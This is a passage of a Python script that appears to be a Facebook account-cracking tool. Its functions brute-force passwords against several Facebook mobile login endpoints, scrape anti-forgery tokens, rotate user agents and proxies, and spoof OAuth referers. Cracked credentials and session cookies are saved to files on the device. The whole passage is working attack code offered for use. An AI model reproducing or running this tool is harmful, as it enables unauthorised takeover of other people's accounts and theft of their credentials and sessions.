J98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'|'+ua+'\n')
				ceker(idf,pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys(): 
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ VALIDATE ]----------###
def metod3(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{m}VALIDATE {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(uaa)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.beta.facebook.com/?locale=id_ID&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.beta.facebook.com/login/save-device/?login_source=login","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				open('/sdcard/OK/CP/'+cph,'a').write(idf+'|'+pw+'\n')
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
				ceker(idf,pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
def crackfree(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r{h}MS {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(uaa)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[  MOBILE ]----------###
def crackmobile(idf,pwv):
	bo = random.choice([m,k,h,b,u,x])
	global loop,ok,cp
	prog.update(des,description=f'\r{h}REG{idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(uaa)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			link = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
if __name__=='__main__':
	try:os.mkdir('/sdcard/OK')
	except:pass
	try:os.mkdir('/sdcard/CP')
	except:pass
	brayenlogin()
